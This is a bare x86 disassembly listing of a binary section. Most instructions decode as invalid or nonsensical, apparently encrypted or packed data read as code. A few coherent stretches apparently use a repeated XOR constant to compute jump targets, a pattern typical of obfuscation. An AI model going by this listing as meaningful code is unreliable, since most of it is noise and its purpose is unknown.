  40cb6d:	mov    ah,0xf
  40cb6f:	shr    DWORD PTR [ebx-0x6b06b6e4],1
  40cb75:	sub    edi,edi
  40cb77:	push   0x7f
  40cb79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb7a:	inc    ecx
  40cb7b:	ins    BYTE PTR es:[edi],dx
  40cb7c:	scas   eax,DWORD PTR es:[edi]
  40cb7d:	mov    al,BYTE PTR [ebx-0x45]
  40cb80:	aam    0x98
  40cb82:	inc    esp
  40cb83:	mov    ebx,0x2f248ceb
  40cb88:	ror    BYTE PTR [esi+eax*2],1
  40cb8b:	call   0xe89b214a
  40cb90:	out    0x53,eax
  40cb92:	loopne 0x40cb22
  40cb94:	add    eax,0x87f69c9
  40cb99:	idiv   bh
  40cb9b:	push   edx
  40cb9c:	fisub  DWORD PTR [esi+0x1e]
  40cb9f:	sub    BYTE PTR [ebp+0x248f9aa9],bh
  40cba5:	adc    bh,al
  40cba7:	adc    al,0x27
  40cba9:	test   al,0xc1
  40cbab:	xor    DWORD PTR [eax],ebx
  40cbad:	les    edi,FWORD PTR [esi+0x21c90a13]
  40cbb3:	pop    ss
  40cbb4:	push   es
  40cbb5:	enter  0xed93,0xca
  40cbb9:	cmc    
  40cbba:	outs   dx,BYTE PTR ds:[esi]
  40cbbb:	mov    ?,WORD PTR [ebp-0x29]
  40cbbe:	xchg   ebx,eax
  40cbbf:	inc    edi
  40cbc0:	je     0x40cc12
  40cbc2:	push   DWORD PTR [ebp-0x30]
  40cbc5:	push   DWORD PTR [ebp+0xc]
  40cbc8:	call   0x410a7f
  40cbcd:	mov    eax,DWORD PTR [ebp-0x4]
  40cbd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40cbd3:	xor    eax,0x7510854
  40cbd8:	add    eax,ebx
  40cbda:	cmp    ecx,eax
  40cbdc:	jne    0x40cbff
  40cbe2:	mov    eax,DWORD PTR [ebp-0x20]
  40cbe5:	inc    edi
  40cbe6:	cmp    edi,eax
  40cbe8:	jb     0x40c413
  40cbee:	jmp    0x40cc0f
  40cbf3:	mov    eax,DWORD PTR [ebp-0x4]
  40cbf6:	xor    eax,esi
  40cbf8:	add    eax,ebx
  40cbfa:	jmp    0x40e33d
  40cbff:	mov    eax,DWORD PTR [ebp-0x2c]
  40cc02:	movzx  eax,WORD PTR [eax+edi*2]
  40cc06:	mov    ecx,DWORD PTR [ebp-0x14]
  40cc09:	mov    eax,DWORD PTR [ecx+eax*4]
  40cc0c:	mov    DWORD PTR [ebp+0xc],eax
  40cc0f:	mov    eax,DWORD PTR [ebp-0x4]
  40cc12:	mov    ecx,DWORD PTR [ebp-0x8]
  40cc15:	xor    eax,0x7510854
  40cc1a:	add    eax,ebx
  40cc1c:	cmp    ecx,eax
  40cc1e:	jne    0x40cf51
  40cc24:	mov    eax,DWORD PTR [ebp-0x4]
  40cc27:	xor    eax,0x7510854
  40cc2c:	jmp    0x40cbf8
  40cc31:	jmp    0x40cf51
  40cc36:	xchg   BYTE PTR [edi-0x6ff40385],dl
  40cc3c:	adc    DWORD PTR [ebp+0x593a5a78],0x38384f64
  40cc46:	and    cl,BYTE PTR [ebx+0x7d7d7e7e]
  40cc4c:	jle    0x40cccc
  40cc4e:	and    DWORD PTR [edi-0xd],ebx
  40cc51:	icebp  
  40cc52:	cli    
  40cc53:	jle    0x40ccb9
  40cc55:	in     al,dx
  40cc56:	imul   esp,esp,0xfa79a34a
  40cc5c:	imul   ebx,DWORD PTR [esp+edi*2],0x8be9e2fe
  40cc63:	jo     0x40ccc8
  40cc65:	(bad)  
  40cc66:	scas   al,BYTE PTR es:[edi]
  40cc67:	stc    
  40cc68:	or     dh,0x76
  40cc6b:	add    BYTE PTR ds:0xb409032e,dh
  40cc71:	jp     0x40cce0
  40cc73:	pop    ebp
  40cc74:	adc    ebx,esp
  40cc76:	imul   esi,DWORD PTR ds:0x137a3177,0xffffffd5
  40cc7d:	bound  esp,QWORD PTR [ebx]
  40cc7f:	sbb    dh,BYTE PTR [esp+ebx*8-0x4015e5e9]
  40cc86:	adc    ebx,DWORD PTR [eax]
  40cc88:	jmp    0x964ba2eb
  40cc8d:	sub    DWORD PTR [ebp+ebx*4+0x45af206],esi
  40cc94:	sti    
  40cc95:	loop   0x40cd08
  40cc97:	out    dx,al
  40cc98:	mov    WORD PTR [eax],?
  40cc9a:	mov    ch,0x9
  40cc9c:	test   DWORD PTR [eax],ebx
  40cc9e:	cmp    al,0x9a
  40cca0:	(bad)  
  40cca1:	popf   
  40cca2:	ret    
  40cca3:	sbb    ch,0xe7
  40cca6:	push   esi
  40cca7:	mov    dh,0xbe
  40cca9:	mov    eax,ds:0x58f8cefe
  40ccae:	jnp    0x40cc43
  40ccb0:	jge    0x40ccb2
  40ccb2:	hlt    
  40ccb3:	or     ebx,DWORD PTR [edx+0x723881e6]
  40ccb9:	les    edx,FWORD PTR [esi*4-0x7216538a]
  40ccc0:	or     esi,edi
  40ccc2:	(bad)  [edi+eax*8+0x499929ca]
  40ccc9:	fwait
  40ccca:	xchg   BYTE PTR [eax-0x2058f78a],dh
  40ccd0:	(bad)  
  40ccd1:	lods   eax,DWORD PTR ds:[esi]
  40ccd2:	push   ds
  40ccd3:	ja     0x40cce0
  40ccd5:	ds adc dh,0xaa
  40ccd9:	out    0xe3,al
  40ccdb:	mov    esi,0xd3cc6284
  40cce0:	push   ebp
  40cce1:	jmp    0x40ccd2
  40cce3:	in     al,0x8e
  40cce5:	call   0xea12:0xb44b9711
  40ccec:	out    dx,eax
  40cced:	hlt    
  40ccee:	push   0x25a244b4
  40ccf3:	fwait
  40ccf4:	pushf  
  40ccf5:	adc    dh,BYTE PTR [ebp-0x6e]
  40ccf8:	popf   
  40ccf9:	jecxz  0x40cd07
  40ccfb:	cdq    
  40ccfc:	call   0x3fd01b3a
  40cd01:	xchg   edi,eax
  40cd02:	out    dx,al
  40cd03:	mov    eax,DWORD PTR [ecx]
  40cd05:	adc    eax,0x439cdbf7
  40cd0a:	or     edx,DWORD PTR [ebp+0x59d64b21]
  40cd10:	jecxz  0x40cd37
  40cd12:	fisub  WORD PTR [edi]
  40cd14:	jmp    0xbc163491
  40cd19:	in     al,dx
  40cd1a:	pop    ebx
  40cd1b:	fidiv  WORD PTR [ebx+0x21]
  40cd1e:	mov    BYTE PTR [esi+0x313fed07],dl
  40cd24:	inc    esi
  40cd25:	int    0xd8
  40cd27:	push   cs
  40cd28:	jns    0x40cd59
  40cd2a:	stos   BYTE PTR es:[edi],al
  40cd2b:	inc    esi
  40cd2c:	nop
  40cd2d:	popf   
  40cd2e:	jno    0x40ccd5
  40cd30:	aad    0x7a
  40cd32:	lea    edi,[edx]
  40cd34:	or     DWORD PTR [eax+0x2af21fb2],0x65
  40cd3b:	mov    al,0x1
  40cd3d:	test   DWORD PTR [esi-0xd80f259],ecx
  40cd43:	dec    edx
  40cd44:	lods   eax,DWORD PTR ds:[esi]
  40cd45:	dec    esi
  40cd46:	test   BYTE PTR [edx-0xc],bh
  40cd49:	(bad)  
  40cd4a:	loop   0x40cd47
  40cd4c:	mov    ebx,0x46b0062b
  40cd51:	mov    bl,0x8a
  40cd53:	adc    eax,0x3c3c846b
  40cd58:	pop    esp
  40cd59:	add    DWORD PTR [edi],0x28
  40cd5c:	and    DWORD PTR [edx],esi
  40cd5e:	aam    0x16
  40cd60:	fdivp  st(2),st
  40cd62:	push   ss
  40cd63:	pop    ds
  40cd64:	jge    0x40ccf5
  40cd66:	push   edx
  40cd67:	mov    esp,0x5e8fca99
  40cd6c:	cwde   
  40cd6d:	int    0xaa
  40cd6f:	mov    al,0xf6
  40cd71:	add    dh,BYTE PTR es:[edi+0x72]
  40cd75:	adc    bl,ah
  40cd77:	adc    cl,0xe2
  40cd7a:	movq   QWORD PTR [edi+0x59],mm5
  40cd7e:	sbb    DWORD PTR [eax+0x3ec50ce0],eax
  40cd84:	(bad)  
  40cd85:	fadd   QWORD PTR [edx+0x2ff5da00]
  40cd8b:	std    
  40cd8c:	cld    
  40cd8d:	int3   
  40cd8e:	pop    edi
  40cd8f:	mov    ch,0x70
  40cd91:	inc    ebx
  40cd92:	popa   
  40cd93:	lods   eax,DWORD PTR ds:[esi]
  40cd94:	mov    ds:0xd6484388,al
  40cd99:	dec    edx
  40cd9a:	jns    0x40cd28
  40cd9c:	jne    0x40cdab
  40cd9e:	mov    cs,esp
  40cda0:	ret    0xc974
  40cda3:	hlt    
  40cda4:	mov    ds:0x246d9626,al
  40cda9:	mov    esi,0x38765e1a
  40cdae:	sbb    DWORD PTR ds:0x93a0a862,eax
  40cdb4:	lock xchg edi,eax
  40cdb6:	daa    
  40cdb7:	es cmp eax,0x2dca0d88
  40cdbd:	lahf   
  40cdbe:	push   ebp
  40cdbf:	push   edx
  40cdc0:	mov    sp,0x1e2d
  40cdc4:	iret   
  40cdc5:	mov    al,0x4a
  40cdc7:	loope  0x40cd6f
  40cdc9:	ins    DWORD PTR es:[edi],dx
  40cdca:	aaa    
  40cdcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdcc:	das    
  40cdcd:	push   esi
  40cdce:	push   ds
  40cdcf:	pop    DWORD PTR [edi]
  40cdd1:	mov    al,0x2c
  40cdd3:	in     al,dx
  40cdd4:	leave  
  40cdd5:	sti    
  40cdd6:	rcr    DWORD PTR [edi],0x78
  40cdd9:	call   0x31d7534b
  40cdde:	ret    0x4c72
  40cde1:	push   esp
  40cde2:	push   edi
  40cde3:	rcr    BYTE PTR [ebp+0x59],cl
  40cde6:	arpl   WORD PTR [eax-0x1],bp
  40cde9:	mov    BYTE PTR [edx+esi*4-0x66],ah
  40cded:	mov    edi,0xb9630c52
  40cdf2:	mov    edx,0xefaa231b
  40cdf7:	or     eax,0x8d4ad14f
  40cdfc:	cli    
  40cdfd:	and    al,0xf
  40cdff:	dec    esp
  40ce00:	mov    DWORD PTR [bx+di+0x75],edx
  40ce04:	ret    0xf1ba
  40ce07:	out    dx,al
  40ce08:	jg     0x40cdd8
  40ce0a:	sahf   
  40ce0b:	icebp  
  40ce0c:	pop    esp
  40ce0d:	push   eax
  40ce0e:	cld    
  40ce0f:	xor    edi,DWORD PTR [edi-0x123dc91b]
  40ce15:	xchg   esi,eax
  40ce16:	add    BYTE PTR [ecx+eax*2],0x69
  40ce1a:	mov    ebx,0xd6e2e8f5
  40ce1f:	(bad)  
  40ce20:	mov    dh,0x1b
  40ce22:	je     0x40cde7
  40ce24:	push   0xde1c1924
  40ce29:	mov    dl,0x93
  40ce2b:	in     eax,0x7f
  40ce2d:	adc    edx,DWORD PTR [esi+0x3f]
  40ce30:	add    BYTE PTR [eax+0x7d],cl
  40ce33:	ja     0x40ce58
  40ce35:	test   bl,bh
  40ce37:	xor    ch,dh
  40ce39:	xchg   ebp,eax
  40ce3a:	inc    edx
  40ce3b:	xchg   esp,eax
  40ce3c:	dec    ebx
  40ce3d:	shr    DWORD PTR [ecx+0x5ab4172a],1
  40ce43:	xor    eax,0x6a377ff0
  40ce48:	sub    cl,BYTE PTR ds:0xab96105e
  40ce4e:	push   eax
  40ce4f:	imul   edi,DWORD PTR [edx-0xb],0x4d
  40ce53:	outs   dx,BYTE PTR ds:[esi]
  40ce54:	mov    edi,0xd6399fc
  40ce59:	jl     0x40ce4c
  40ce5b:	xchg   DWORD PTR [eax+0x8],ebx
  40ce5e:	test   al,0xe4
  40ce60:	hlt    
  40ce61:	add    cl,BYTE PTR [esi+0x14f00744]
  40ce67:	xor    BYTE PTR [edx+esi*2-0x2f],ch
  40ce6b:	mov    esi,0x41b8eaf6
  40ce70:	(bad)  
  40ce71:	pop    ecx
  40ce72:	dec    DWORD PTR [eax-0x57982893]
  40ce78:	call   0x84a573f0
  40ce7d:	jo     0x40ce66
  40ce7f:	and    al,0x68
  40ce81:	jge    0x40ce55
  40ce83:	lods   al,BYTE PTR ds:[esi]
  40ce84:	icebp  
  40ce85:	push   cs
  40ce86:	sar    DWORD PTR [ebp-0x39f19ab8],cl
  40ce8c:	and    al,0x7f
  40ce8e:	call   0x3c75dfaa
  40ce93:	in     al,dx
  40ce94:	pop    esp
  40ce95:	out    0x78,al
  40ce97:	jbe    0x40ce6e
  40ce99:	pop    ss
  40ce9a:	sti    
  40ce9b:	dec    ebp
  40ce9c:	sub    edx,DWORD PTR [edi]
  40ce9e:	out    0x33,al
  40cea0:	jmp    0x40ce95
  40cea2:	mov    ds:0x60b0b4b2,eax
  40cea7:	push   eax
  40cea8:	cmc    
  40cea9:	cmp    eax,0xd6a9eaee
  40ceae:	push   esi
  40ceaf:	test   eax,0xf9ab9c7a
  40ceb4:	aaa    
  40ceb5:	daa    
  40ceb6:	stos   DWORD PTR es:[edi],eax
  40ceb7:	add    dl,BYTE PTR [eax]
  40ceb9:	mov    cl,0x19
  40cebb:	and    ch,BYTE PTR [eax+0x15b14614]
  40cec1:	dec    BYTE PTR [ebp+0x1cfda1e8]
  40cec7:	ja     0x40cef9
  40cec9:	mov    cl,0x3f
  40cecb:	pop    edi
  40cecc:	add    dl,al
  40cece:	adc    al,0x7e
  40ced0:	adc    al,0xd5
  40ced2:	xor    DWORD PTR [ecx+0x4a],0x6ccbd955
  40ced9:	arpl   WORD PTR ds:0x7e5a1246,di
  40cedf:	dec    esp
  40cee0:	mov    bh,0xf3
  40cee2:	mov    esp,0xcf20fb29
  40cee7:	and    BYTE PTR [edi-0x3f3492b3],0x96
  40ceee:	enter  0xf09b,0x79
  40cef2:	ss addr16 push ebx
  40cef5:	imul   esi,edi,0x5b5cdf06
  40cefb:	gs retf 0xe555
  40ceff:	inc    esp
  40cf00:	pop    eax
  40cf01:	xchg   esp,eax
  40cf02:	iret   
  40cf03:	inc    ebx
  40cf04:	cmp    al,0x64
  40cf06:	in     al,0x27
  40cf08:	fwait
  40cf09:	mov    ds:0xe517583d,eax
  40cf0e:	sub    BYTE PTR [edi+edx*2+0x41],ch
  40cf12:	stc    
  40cf13:	neg    DWORD PTR [eax]
  40cf15:	jns    0x40cf6e
  40cf17:	mov    esi,0xe29d8282
  40cf1c:	nop
  40cf1d:	loop   0x40cebb
  40cf1f:	add    bl,BYTE PTR [ebx+edi*4]
  40cf22:	(bad)  
  40cf23:	jae    0x40cec4
  40cf25:	cmp    ch,BYTE PTR [esi-0x5f]
  40cf28:	loop   0x40cf11
  40cf2a:	fstp   QWORD PTR [edi+eax*1+0x75]
  40cf2e:	sub    DWORD PTR [edx+0x5a8e0f5e],0x18
  40cf35:	dec    eax
  40cf36:	sbb    al,0xde
  40cf38:	and    eax,0x70ffc239
  40cf3d:	fsub   QWORD PTR [eax+0x2e]
  40cf40:	pop    edx
  40cf41:	(bad)  
  40cf42:	iret   
  40cf43:	enter  0x9e85,0x57
  40cf47:	mov    ds,WORD PTR [esi+ecx*4+0x3d176410]
  40cf4e:	adc    eax,0x458b5ec5
  40cf53:	or     al,0x3
  40cf55:	inc    ebp
  40cf56:	or     BYTE PTR [ecx+0x458bf045],cl
  40cf5c:	in     al,0x85
  40cf5e:	ror    BYTE PTR [edi],0x84
  40cf61:	push   0x10
  40cf63:	add    BYTE PTR [eax],al
  40cf65:	mov    DWORD PTR [ebp-0x24],esi
  40cf68:	push   0xb
  40cf6a:	pop    ecx
  40cf6b:	push   0x5
  40cf6d:	dec    ecx
  40cf6e:	jmp    0x40d28e
  40cf73:	test   DWORD PTR [ebx],ebx
  40cf75:	jnp    0x40cfa2
  40cf77:	mov    eax,ds:0x98b1b52b
  40cf7c:	xchg   ecx,eax
  40cf7d:	rcr    dl,0x60
  40cf80:	sub    al,dl
  40cf82:	mov    al,0x21
  40cf84:	xchg   esi,eax
  40cf85:	jle    0x40d005
  40cf87:	jge    0x40d006
  40cf89:	jle    0x40d009
  40cf8b:	sub    BYTE PTR [edi+0x9231a6],ah
  40cf91:	cmp    BYTE PTR ds:0x7c96b8a0,cl
  40cf97:	pop    edx
  40cf98:	aam    0x34
  40cf9a:	adc    esp,edi
  40cf9c:	jbe    0x40cfe1
  40cf9e:	fidivr WORD PTR [edi]
  40cfa0:	test   BYTE PTR [ebx-0x1f],0x16
  40cfa4:	stos   DWORD PTR es:[edi],eax
  40cfa5:	cmp    DWORD PTR [ebx],edi
  40cfa7:	add    eax,0x1eab4fa3
  40cfac:	sub    ebx,DWORD PTR [eax]
  40cfae:	xor    edx,0x7b
  40cfb1:	aad    0x37
  40cfb3:	stos   DWORD PTR es:[edi],eax
  40cfb4:	jp     0x40cfac
  40cfb6:	aam    0x94
  40cfb8:	mov    ah,0xa4
  40cfba:	mov    ch,0x84
  40cfbc:	mov    cs,WORD PTR [esi]
  40cfbe:	cmp    ebp,DWORD PTR [ebp+0x16]
  40cfc1:	idiv   BYTE PTR [eax]
  40cfc3:	dec    ecx
  40cfc4:	clc    
  40cfc5:	addr16 adc eax,ebp
  40cfc8:	mov    dl,0x93
  40cfca:	jbe    0x40cf72
  40cfcc:	(bad)  [edi+0x10d417bb]
  40cfd2:	or     al,0xdb
  40cfd4:	(bad)  
  40cfd5:	fs jnp 0x40cf98
  40cfd8:	jo     0x40cfea
  40cfda:	loope  0x40cfe0
  40cfdc:	fldcw  WORD PTR [edi]
  40cfde:	cmovne ecx,DWORD PTR [edi]
  40cfe1:	pushf  
  40cfe2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfe3:	mov    eax,ds:0x8116f875
  40cfe8:	test   al,0xad
  40cfea:	and    eax,0x79f5ff8c
  40cfef:	sub    esi,eax
  40cff1:	sub    bl,BYTE PTR [edx]
  40cff3:	loop   0x40d04c
  40cff5:	(bad)  
  40cff6:	(bad)  
  40cff7:	out    0xe6,eax
  40cff9:	add    eax,0x6bd3f5d0
  40cffe:	mov    edi,0x63064884
  40d003:	mov    edi,0xa5dc6182
  40d008:	mov    bl,0x50
  40d00a:	pop    ds
  40d00b:	ja     0x40cfeb
  40d00d:	inc    edx
  40d00e:	fild   WORD PTR [eax+ebx*4+0x1d49c25e]
  40d015:	jno    0x40d08a
  40d017:	cli    
  40d018:	or     ah,ch
  40d01a:	dec    ecx
  40d01b:	in     al,0xef
  40d01d:	pushf  
  40d01e:	ins    DWORD PTR es:[edi],dx
  40d01f:	fmul   st(4),st
  40d021:	inc    ebp
  40d022:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d023:	retf   0x8165
  40d026:	inc    ebp
  40d027:	test   BYTE PTR [edx],0xac
  40d02a:	clc    
  40d02b:	outs   dx,BYTE PTR ds:[esi]
  40d02c:	add    ah,BYTE PTR [edx+0xf]
  40d02f:	mul    eax
  40d031:	(bad)  
  40d032:	add    edi,DWORD PTR [esi]
  40d034:	cld    
  40d035:	shl    BYTE PTR [eax-0x6c509439],0x7b
  40d03c:	pop    ebx
  40d03d:	fcmovbe st,st(0)
  40d03f:	sbb    eax,0xe057c46
  40d044:	xor    edi,esi
  40d046:	jne    0x40d075
  40d048:	int3   
  40d049:	xchg   esp,esi
  40d04b:	dec    eax
  40d04c:	int3   
  40d04d:	or     bl,ch
  40d04f:	xor    al,0x43
  40d051:	push   esp
  40d052:	fiadd  WORD PTR [eax]
  40d054:	xor    ebp,DWORD PTR [edi]
  40d056:	inc    ebx
  40d057:	jl     0x40d044
  40d059:	mov    bh,BYTE PTR [ebx]
  40d05b:	mov    BYTE PTR [ebp-0x3b],0x79
  40d05f:	mov    bh,0xb1
  40d061:	test   al,0x88
  40d063:	xchg   ebx,eax
  40d064:	das    
  40d065:	sbb    esp,DWORD PTR [edx]
  40d067:	ja     0x40d086
  40d069:	int3   
  40d06a:	sbb    BYTE PTR [edi+0x69],bl
  40d06d:	or     eax,0x6607a81e
  40d072:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40d074:	mov    ds:0x595aadc5,eax
  40d079:	jmp    0xd1d1:0x341675df
  40d080:	jge    0x40d02a
  40d082:	pusha  
  40d083:	inc    edi
  40d084:	sub    DWORD PTR [ebp-0x32],edi
  40d087:	dec    ebp
  40d088:	dec    esi
  40d089:	inc    esp
  40d08a:	xchg   esp,eax
  40d08b:	xchg   esi,eax
  40d08c:	sub    dl,BYTE PTR [esi]
  40d08e:	(bad)  
  40d08f:	push   esi
  40d090:	dec    eax
  40d091:	ss fcmovnbe st,st(2)
  40d094:	outs   dx,DWORD PTR ds:[esi]
  40d095:	jns    0x40d08a
  40d097:	hlt    
  40d098:	icebp  
  40d099:	push   ecx
  40d09a:	mov    al,ds:0xce31c185
  40d09f:	adc    ecx,eax
  40d0a1:	and    BYTE PTR [ecx],bh
  40d0a3:	mov    ah,BYTE PTR [ebp-0x52dad05f]
  40d0a9:	int3   
  40d0aa:	pop    ecx
  40d0ab:	mov    ds:0xffe610ba,eax
  40d0b0:	dec    esi
  40d0b1:	push   ss
  40d0b2:	out    0xc4,eax
  40d0b4:	or     al,0xd9
  40d0b6:	or     BYTE PTR [ebp+0x76],0xc0
  40d0ba:	sub    eax,0x40bb5ac1
  40d0bf:	and    ebx,DWORD PTR [esi]
  40d0c1:	sbb    BYTE PTR [ecx+0x16b86ab6],ah
  40d0c7:	jge    0x40d106
  40d0c9:	idiv   al
  40d0cb:	add    DWORD PTR [edx+eiz*8],ecx
  40d0ce:	aaa    
  40d0cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0d0:	or     esp,DWORD PTR [esi+ebp*8-0x61]
  40d0d4:	jo     0x40d09f
  40d0d6:	xor    ebp,edx
  40d0d8:	cdq    
  40d0d9:	sbb    eax,0x97c8d7bc
  40d0de:	dec    eax
  40d0df:	jno    0x40d06f
  40d0e1:	out    0x9f,eax
  40d0e3:	xor    al,0x2c
  40d0e5:	lock cmp DWORD PTR [esi+0x5427beb0],esp
  40d0ec:	jmp    FWORD PTR [esi+ebp*4]
  40d0ef:	shl    BYTE PTR [edx+0x3c923d72],0x19
  40d0f6:	jnp    0x40d0b5
  40d0f8:	std    
  40d0f9:	and    al,0xf4
  40d0fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0fc:	shl    bl,1
  40d0fe:	pop    ecx
  40d0ff:	ins    DWORD PTR es:[edi],dx
  40d100:	mov    bl,0x5e
  40d102:	inc    edi
  40d103:	pop    ebp
  40d104:	jp     0x40d10c
  40d106:	and    DWORD PTR [edi+0x6a],edi
  40d109:	xchg   edi,eax
  40d10a:	xlat   BYTE PTR ds:[ebx]
  40d10b:	xchg   ebp,eax
  40d10c:	pop    edi
  40d10d:	fstp   TBYTE PTR ds:0xa9a3ed5b
  40d113:	data16 mov cl,0x23
  40d116:	mov    ebp,0x5f137b92
  40d11b:	fcomp  DWORD PTR [ecx+0x4]
  40d11e:	mov    al,ds:0x4d522c71
  40d123:	adc    DWORD PTR [edi],ebx
  40d125:	xchg   esp,eax
  40d126:	pop    edi
  40d127:	xor    eax,0x371f26ec
  40d12c:	mov    WORD PTR [esi-0x32b616f],?
  40d132:	xor    DWORD PTR [esi],edi
  40d134:	pop    ebp
  40d135:	mov    dh,0xb2
  40d137:	xchg   ecx,eax
  40d138:	adc    BYTE PTR ds:0xbf045ff5,dl
  40d13e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d13f:	push   ecx
  40d140:	outs   dx,BYTE PTR ds:[esi]
  40d141:	scas   eax,DWORD PTR es:[edi]
  40d142:	dec    ecx
  40d143:	test   ah,al
  40d145:	sub    ecx,ebp
  40d147:	jae    0x40d0fb
  40d149:	xor    esi,DWORD PTR [ebp+0x4307638]
  40d14f:	or     eax,0x6d83ba93
  40d154:	ja     0x40d171
  40d156:	call   0xb06bc1b
  40d15b:	mov    al,0x59
  40d15d:	out    dx,al
  40d15e:	pop    edx
  40d15f:	push   ss
  40d160:	gs aaa 
  40d162:	sbb    eax,edx
  40d164:	xor    ch,BYTE PTR [ecx]
  40d166:	bound  ebx,QWORD PTR [eax]
  40d168:	mov    WORD PTR [ebp+edx*2+0x6972cd68],es
  40d16f:	cmp    cl,0xf4
  40d172:	lods   al,BYTE PTR ds:[esi]
  40d173:	nop
  40d174:	fadd   st(0),st
  40d176:	gs idiv esp
  40d179:	shr    BYTE PTR [ecx+0x6e00285],0xc3
  40d180:	mov    bh,0xcf
  40d182:	mov    eax,ds:0x1ca13e39
  40d187:	mov    ecx,DWORD PTR [ebx+0x50ae8c01]
  40d18d:	dec    edi
  40d18e:	das    
  40d18f:	clc    
  40d190:	or     al,0x5a
  40d192:	xor    esp,DWORD PTR [ebx]
  40d194:	and    al,0x9b
  40d196:	nop
  40d197:	push   0x6b
  40d199:	outs   dx,DWORD PTR ds:[esi]
  40d19a:	sub    ch,ah
  40d19c:	ret    0x1a09
  40d19f:	sti    
  40d1a0:	and    cl,0x8e
  40d1a3:	test   al,0x61
  40d1a5:	push   ebx
  40d1a6:	cmp    eax,0x33066634
  40d1ab:	push   esp
  40d1ac:	add    DWORD PTR [ecx-0x18799a47],0xcabbe1c
  40d1b6:	ss out dx,al
  40d1b8:	in     eax,0x67
  40d1ba:	nop
  40d1bb:	dec    edx
  40d1bc:	retf   
  40d1bd:	int    0xc0
  40d1bf:	mov    edi,0xdbff0a0d
  40d1c4:	arpl   WORD PTR [esi+0x37b5b46a],bp
  40d1ca:	int    0xfd
  40d1cc:	lea    edi,[edx]
  40d1ce:	adc    al,0x2d
  40d1d0:	aaa    
  40d1d1:	adc    dl,al
  40d1d3:	mov    esi,0x6951bc06
  40d1d8:	add    BYTE PTR [eax+ecx*4-0x74acf9ed],dh
  40d1df:	sbb    DWORD PTR [ebp-0x2c],eax
  40d1e2:	mov    esi,0xdb15724f
  40d1e7:	mov    dl,0x7f
  40d1e9:	inc    esp
  40d1ea:	test   al,0xf6
  40d1ec:	jne    0x40d264
  40d1ee:	cmp    DWORD PTR [ebx],edx
  40d1f0:	pop    ecx
  40d1f1:	aaa    
  40d1f2:	mov    al,0x65
  40d1f4:	int    0x89
  40d1f6:	fcmovnb st,st(7)
  40d1f8:	ins    DWORD PTR es:[edi],dx
  40d1f9:	cmp    esi,DWORD PTR [eax]
  40d1fb:	mov    bl,0x2a
  40d1fd:	dec    edx
  40d1fe:	xor    eax,0xf0eea31b
  40d203:	cmp    eax,0x51fe629a
  40d208:	es mov esp,0xb612c6fd
  40d20e:	fnop   
  40d210:	lahf   
  40d211:	in     al,dx
  40d212:	scas   al,BYTE PTR es:[edi]
  40d213:	cmp    DWORD PTR [esi],ebp
  40d215:	inc    ecx
  40d216:	les    ebp,FWORD PTR [eax-0x59]
  40d219:	adc    eax,esp
  40d21b:	lahf   
  40d21c:	jo     0x40d1fd
  40d21e:	mov    dl,0x0
  40d220:	inc    eax
  40d221:	ror    BYTE PTR [esi-0x2c0fcc0e],0xb1
  40d228:	push   edx
  40d229:	icebp  
  40d22a:	lds    edx,FWORD PTR [ebp*8-0x3657ed43]
  40d231:	mov    ebx,0xaca192bc
  40d236:	sub    al,0x1e
  40d238:	call   0x1918c120
  40d23d:	std    
  40d23e:	inc    esi
  40d23f:	hlt    
  40d240:	ret    
  40d241:	xchg   esp,eax
  40d242:	dec    ebx
  40d243:	(bad)  
  40d244:	jge    0x40d2c4
  40d246:	lods   eax,DWORD PTR ds:[esi]
  40d247:	ds cmc 
  40d249:	cs cmc 
  40d24b:	mov    ecx,eax
  40d24d:	mov    DWORD PTR [edx],edx
  40d24f:	jl     0x40d28f
  40d251:	fldenv [eax+0xf]
  40d254:	fiadd  DWORD PTR [ebx-0x49]
  40d257:	or     al,0x5c
  40d259:	push   ebp
  40d25a:	imul   esp,DWORD PTR [esi+ecx*2-0x540019cc],0x75a29a93
  40d265:	jns    0x40d202
  40d267:	mov    al,dl
  40d269:	imul   edx,DWORD PTR [ecx+edi*2],0xffffffd9
  40d26d:	pop    ebx
  40d26e:	scas   al,BYTE PTR es:[edi]
  40d26f:	or     BYTE PTR [eax+0x180b343d],cl
  40d275:	stos   DWORD PTR es:[edi],eax
  40d276:	inc    esp
  40d277:	or     ch,BYTE PTR [ebp+0x3656446f]
  40d27d:	pop    ss
  40d27e:	inc    esp
  40d27f:	rol    esp,1
  40d281:	fist   WORD PTR [ebx+0x54]
  40d284:	jmp    0x883b4399
  40d289:	push   cs
  40d28a:	mov    ebx,?
  40d28c:	mov    DWORD PTR [esi],edx
  40d28e:	pop    ebx
  40d28f:	xchg   ebx,ecx
  40d291:	sub    ebx,ecx
  40d293:	xchg   ebx,ecx
  40d295:	dec    ecx
  40d296:	mov    eax,DWORD PTR [ebp-0x1c]
  40d299:	imul   eax,ecx
  40d29c:	sub    esp,eax
  40d29e:	mov    DWORD PTR [ebp-0x24],esp
  40d2a1:	mov    eax,DWORD PTR [ebp-0x4]
  40d2a4:	mov    ecx,0x7510854
  40d2a9:	xor    eax,ecx
  40d2ab:	mov    edx,0x32729b
  40d2b0:	add    eax,edx
  40d2b2:	mov    DWORD PTR [ebp+0x8],eax
  40d2b5:	mov    eax,DWORD PTR [ebp-0x18]
  40d2b8:	xor    eax,ecx
  40d2ba:	add    eax,edx
  40d2bc:	mov    edx,DWORD PTR [ebp+0x14]
  40d2bf:	jmp    0x40d5df
  40d2c4:	xor    ch,cl
  40d2c6:	xor    DWORD PTR [ecx+0x69b241f1],eax
  40d2cc:	xor    esi,ebx
  40d2ce:	pop    ecx
  40d2d0:	dec    ecx
  40d2d1:	mov    DWORD PTR [ecx],edx
  40d2d3:	lds    ebp,FWORD PTR [edx*4+0x7d7d7e7e]
  40d2da:	jle    0x40d35a
  40d2dc:	pop    ecx
  40d2dd:	pop    ss
  40d2de:	or     al,0x4d
  40d2e0:	pop    ebp
  40d2e1:	sub    al,0xc2
  40d2e3:	jg     0x40d29c
  40d2e5:	enter  0xa4ed,0xcf
  40d2e9:	(bad)  
  40d2ea:	pusha  
  40d2eb:	rcr    eax,1
